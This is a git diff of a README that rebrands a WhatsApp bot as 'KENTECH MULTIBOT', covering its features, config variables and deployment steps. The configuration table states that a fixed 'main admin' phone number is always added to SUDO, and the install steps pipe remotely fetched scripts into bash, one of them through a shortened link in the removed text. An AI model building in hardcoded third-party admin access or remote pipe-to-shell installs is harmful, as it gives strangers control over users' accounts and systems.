@@ -1,143 +1,210 @@
-# WhatsApp MD User Bot
+# 🤖 KENTECH MULTIBOT
 
-A powerful and feature-rich WhatsApp bot supporting multiple sessions, designed for seamless automation and enhanced user experience.
+[![Deploy](https://img.shields.io/badge/Deploy-Now-brightgreen)](https://kentech-session-generator.vercel.app)
+[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Node.js](https://img.shields.io/badge/Node.js-20+-green.svg)](https://nodejs.org)
 
-### Features
+**KENTECH MULTIBOT** is a powerful and feature-rich WhatsApp bot built with Node.js and Baileys. It supports multiple sessions, customizable responses, and automated task execution for seamless WhatsApp automation.
 
-- **Multi-Session Support** – Manage multiple accounts effortlessly.
-- **Customizable Responses** – Configure responses in different languages.
-- **Automated Task Execution** – Perform actions without manual intervention.
-- **Easy Deployment** – Multiple hosting options for quick setup.
+## ✨ Features
 
-### Supported Languages
+- 🚀 **Multi-Session Support** – Manage multiple WhatsApp accounts
+- 🌐 **Multi-Language Support** – Available in 10+ languages
+- 🎨 **Customizable Responses** – Personalize bot behavior
+- 🔧 **Easy Deployment** – Multiple hosting options
+- 📱 **QR Code Session Generator** – Simple setup process
+- 🛡️ **Anti-Link/Anti-Spam** – Advanced group protection
+- 🎵 **Media Processing** – Audio, video, and image manipulation
+- 📊 **Database Support** – SQLite & PostgreSQL
 
-This bot supports multiple languages for responses. Set your preferred language using the `BOT_LANG` variable in the `config.env` file.
+## 🌍 Supported Languages
 
-**Available languages:**
+Set your preferred language using the `BOT_LANG` variable in `config.env`:
 
-- **bn** – Bengali  
-- **en** – English  
-- **es** – Spanish  
-- **hi** – Hindi  
-- **id** – Indonesian  
-- **ur** – Urdu  
-- **tr** – Turkish  
-- **fr** – French  
-- **ru** – Russian  
-- **ar** – Arabic  
+| Language | Code | Language | Code |
+|----------|------|----------|------|
+| English | `en` | Spanish | `es` |
+| Hindi | `hi` | French | `fr` |
+| Arabic | `ar` | Russian | `ru` |
+| Bengali | `bn` | Turkish | `tr` |
+| Indonesian | `id` | Urdu | `ur` |
 
-To set the bot language to Spanish, add the following line to your `config.env` file:
+## 🚀 Quick Deploy
 
+### ⚡ VPS Deployment (Fastest)
+
+**One-command deployment for VPS/Server:**
+
+```bash
+bash <(curl -fsSL https://raw.githubusercontent.com/Investor45/kentech-multibot/master/deploy.sh)
+```
+
+**Perfect for:** VPS, Dedicated Servers, Ubuntu/Debian systems  
+**Setup time:** 5-10 minutes  
+**Docs:** [VPS Quick Deploy Guide](VPS-QUICK-DEPLOY.md)
+
+---
+
+### 1️⃣ Generate Session ID
+
+Visit our session generator: **[KENTECH Session Generator](https://kentech-session-generator.vercel.app)**
+
+1. Click "Generate QR Code"
+2. Scan with WhatsApp (Settings → Linked Devices → Link a Device)
+3. Copy the generated session ID
+
+### 2️⃣ Deploy on Heroku
+
+[![Deploy to Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Investor45/kentech-multibot)
+
+### 3️⃣ Deploy on Railway
+
+[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https://github.com/Investor45/kentech-multibot)
+
+### 4️⃣ Deploy on Render
+
+[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/Investor45/kentech-multibot)
+
+## 🖥️ VPS Deployment
+
+### Quick Installation (Ubuntu/Debian)
+
+```bash
+bash <(curl -fsSL https://raw.githubusercontent.com/Investor45/kentech-multibot/master/deploy.sh)
+```
+
+### Manual Installation
+
+#### 1. **Install Dependencies**
+
+```bash
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install Node.js 20.x
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install nodejs git ffmpeg -y
+
+# Install Yarn and PM2
+sudo npm install -g yarn pm2
+```
+
+#### 2. **Clone Repository**
+
+```bash
+git clone https://github.com/Investor45/kentech-multibot.git
+cd kentech-multibot
+yarn install
+```
+
+#### 3. **Configure Environment**
+
+```bash
+cp config.env.example config.env
+nano config.env
+```
+
+**Required Variables:**
 ```env
-BOT_LANG=es
-```
----
-
-### Deployment Guide
-
-### 1️⃣ Deploy on Koyeb
-
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Koyeb.
-
-### 2️⃣ Deploy on Render
-
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Render.
-
-### 3️⃣ Deploy on a VPS or PC (Ubuntu Example)
-
-#### **Quick Installation**
-
-Run the following command:
-
-```sh
-bash <(curl -fsSL http://bit.ly/43JqREw)
+SESSION_ID=your_session_id_here
+PREFIX=.
+STICKER_PACKNAME=KENTECH
+BOT_LANG=en
+SUDO=your_number_here
 ```
 
-#### **Manual Installation**
+#### 4. **Start the Bot**
 
-1. **Update System and Install Dependencies:**
+```bash
+# Start with PM2
+npm start
 
-   ```sh
-   sudo apt update && sudo apt upgrade -y
-   sudo apt install git ffmpeg curl -y
-   ```
+# Or start directly
+node index.js
+```
 
-2. **Install Node.js (Version 20.x Recommended):**
+## ⚙️ Configuration Variables
 
-   ```sh
-   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-   sudo apt install nodejs -y
-   ```
+| Variable | Description | Default |
+|----------|-------------|---------|
+| `SESSION_ID` | WhatsApp session credentials | Required |
+| `PREFIX` | Bot command prefix | `.` |
+| `BOT_LANG` | Bot language | `en` |
+| `SUDO` | Admin phone numbers (comma-separated). Main admin +237670217260 is always included | - |
+| `STICKER_PACKNAME` | Sticker pack name | `KENTECH` |
+| `MAX_UPLOAD` | Max file upload size (MB) | `20000` |
+| `AUTO_STATUS_VIEW` | Auto view status updates | `true` |
+| `REJECT_CALL` | Auto reject calls | `false` |
 
-3. **Install Yarn and PM2 for Process Management:**
+## 🛠️ Development
 
-   ```sh
-   sudo npm install -g yarn
-   yarn global add pm2
-   ```
+### Setting Up Development Environment
 
-4. **Clone the Repository and Install Dependencies:**
+```bash
+# Clone repository
+git clone https://github.com/Investor45/kentech-multibot.git
+cd kentech-multibot
 
-   ```sh
-   git clone https://github.com/lyfe00011/levanter botName
-   cd botName
-   yarn install
-   ```
+# Install dependencies
+yarn install
 
-5. **Configure Environment Variables:**
+# Start in development mode
+yarn dev
+```
 
-   Create a `config.env` file and add the following lines:
+### Project Structure
 
-   ```sh
-   SESSION_ID=your_session_id_here
-   PREFIX=.
-   STICKER_PACKNAME=LyFE
-   ALWAYS_ONLINE=false
-   RMBG_KEY=null
-   LANGUAG=en
-   BOT_LANG=en
-   WARN_LIMIT=3
-   FORCE_LOGOUT=false
-   BRAINSHOP=159501,6pq8dPiYt7PdqHz3
-   MAX_UPLOAD=200
-   REJECT_CALL=false
-   SUDO=989876543210
-   TZ=Asia/Kolkata
-   VPS=true
-   AUTO_STATUS_VIEW=true
-   SEND_READ=true
-   AJOIN=true
-   DISABLE_START_MESSAGE=false
-   PERSONAL_MESSAGE=null
-   ```
+```
+kentech-multibot/
+├── lib/                 # Core library files
+├── plugins/             # Bot plugins/commands
+├── lang/               # Language files
+├── media/              # Media assets
+├── config.env          # Environment configuration
+├── index.js           # Main entry point
+└── package.json       # Dependencies
+```
 
-6. **Start the Bot Using PM2:**
+## 📝 Available Commands
 
-   To start the bot, run:
+| Command | Description |
+|---------|-------------|
+| `.ping` | Check bot responsiveness |
+| `.help` | Show available commands |
+| `.alive` | Bot status information |
+| `.menu` | Display command menu |
+| `.img <query>` | Search and download images |
+| `.sticker` | Convert image/video to sticker |
+| `.weather <city>` | Get weather information |
 
-   ```sh
-   pm2 start . --name botName --attach --time
-   ```
+## 🤝 Contributing
 
-   To stop the bot, run:
+We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.
 
-   ```sh
-   pm2 stop botName
-   ```
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+## 📄 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## 🙏 Acknowledgments
+
+- **[Baileys](https://github.com/WhiskeySockets/Baileys)** - WhatsApp Web API
+- All contributors and users of KENTECH MULTIBOT
+
+## 📞 Support
+
+- **GitHub Issues**: [Report bugs or request features](https://github.com/Investor45/kentech-multibot/issues)
+- **Discord**: [Join our community](https://discord.gg/YOUR_DISCORD)
+- **Telegram**: [Support group](https://t.me/kentechnew)
+
 ---
 
-### Credits & Acknowledgments
-
-A special thanks to:
-
-- **[Yusuf Usta](https://github.com/Quiec)** – Creator of [WhatsAsena](https://github.com/yusufusta/WhatsAsena).  
-- **[@adiwajshing](https://github.com/adiwajshing)** – Developer of [Baileys](https://github.com/adiwajshing/Baileys).
-
----
-
-## 🛠 Need Help?
-
-For more information on setting up environment variables and FAQs, please visit:
-
-- [Bot Environment Variables](https://levanter-delta.vercel.app/)  
-- [Frequently Asked Questions](https://levanter-delta.vercel.app/)
+<div align="center">
+  <h3>🌟 Star this repository if you found it helpful!</h3>
+  <h4>Made with ❤️ by KENTECH Team</h4>
+</div>
